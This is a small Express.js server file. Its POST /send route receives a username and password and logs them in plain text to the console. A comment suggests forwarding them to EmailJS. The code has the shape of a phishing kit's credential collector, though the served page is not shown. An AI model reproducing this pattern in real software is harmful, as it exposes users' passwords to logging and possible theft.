import express from "express";
import bodyParser from "body-parser";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static("public"));

// ✅ Sample route (optional)
app.get("/ping", (req, res) => {
  res.json({ message: "Server is live ✅" });
});

// ✅ Example route for EmailJS or API forwarding (optional)
app.post("/send", async (req, res) => {
  try {
    const { user, pass } = req.body;

    // You can forward this to EmailJS or log internally
    console.log("Received data:", { user, pass });

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
